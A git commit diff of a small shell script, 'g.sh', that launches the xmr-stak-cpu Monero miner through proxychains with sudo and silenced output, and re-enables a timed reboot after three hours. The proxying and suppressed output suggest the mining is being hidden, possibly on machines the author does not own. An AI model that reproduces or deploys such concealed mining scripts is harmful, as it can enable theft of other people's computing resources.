abb1d749fbc9a942fecd7942b1fb7ac5a16f0175
smithinoz <smithinoz@users.noreply.github.com>
2017-06-19 23:54:32 +1000

    Update g.sh

--- g.sh
+++ g.sh
@@ -3,11 +3,11 @@ sudo sysctl -w vm.nr_hugepages=128
 file="/flag2"
 if [ -f "$file" ]
 then
-	sudo chmod +x /xmr-stak-cpu/bin/xmr-stak-cpu	
- 	sudo chmod +x /proxychains-ng/proxychains4	
- 	sudo chmod +x /proxychains-ng/libproxychains4.so
+	sudo chmod +x /m/test01/xmr-stak-cpu/bin/xmr-stak-cpu	
+ 	sudo chmod +x /m/test01/proxychains-ng/proxychains4	
+ 	sudo chmod +x /m/test01/proxychains-ng/libproxychains4.so
 	sudo cp /m/test01/xmr/config.txt /m/test01/xmr-stak-cpu/bin/config.txt
-#        ( sleep 10800 ; reboot ) & 
+        ( sleep 10800 ; reboot ) & 
 	cd /m/test01/xmr-stak-cpu/bin/
         sudo /m/test01/proxychains-ng/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr-stak-cpu/bin/xmr-stak-cpu >/dev/null 2>&1
         sudo reboot   
